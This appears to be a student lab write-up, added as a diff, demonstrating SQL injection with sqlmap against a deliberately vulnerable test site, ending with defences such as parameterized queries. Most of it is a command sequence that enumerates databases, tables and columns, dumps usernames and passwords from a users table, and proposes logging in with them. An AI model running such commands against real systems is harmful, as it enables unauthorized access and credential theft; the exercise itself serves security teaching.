@@ -1,0 +1,22 @@
+Aim : To demonstrate SQL Injection using SQLMap 
+
+
+sudo apt-get install sqlmap
+sqlmap -h                                                                                           ----> Shows sqlmap’s help/usage screen and available options
+
+ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1                                          ----> Tests the given URL for SQL injection vulnerabilities
+ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs                                    ----> If injectable, enumerates/databases present on the backend DB server
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables                        ----> Targets the database named acuart and lists its tables
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns              ----> Targets the users table in acuart and lists its column names
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump        ----> Dumps (retrieves) the data from the uname column of the users table
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump         ----> Dumps the data from the pass column of the users table
+
+----> ## now we will try to log in or log in using the existing username and password   
+
+Conclusion:
+Hence in this experiment we learned SQL injection and how sqlmap automates finding and exploiting SQL 
+injection to enumerate and dump database data — prevent it with parameterized queries, input validation, and least-privilege.
